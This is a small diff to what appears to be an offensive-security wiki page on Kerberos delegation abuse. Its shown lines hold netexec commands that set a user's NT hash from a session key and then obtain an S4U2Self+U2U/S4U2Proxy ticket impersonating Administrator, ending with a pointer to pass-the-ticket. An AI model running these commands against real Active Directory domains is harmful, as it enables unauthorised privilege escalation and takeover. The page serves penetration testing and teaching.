@@ -240,8 +240,7 @@ describeTicket.py "$USER.ccache"
 nxc smb "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M change-password -o NEWNTHASH='<rc4_session_key>'
 
 # Obtain the delegated service ticket through S4U2Self+U2U, followed by S4U2Proxy
-export KRB5CCNAME="$USER.ccache"
-nxc smb "$DC_IP" --use-kcache --delegate Administrator --u2u
+KRB5CCNAME="$USER.ccache" nxc smb "$DC_IP" --use-kcache --delegate Administrator --u2u
 ```
 
 After these steps, the final service ticket can be used with [Pass-the-ticket](../ptt.md).
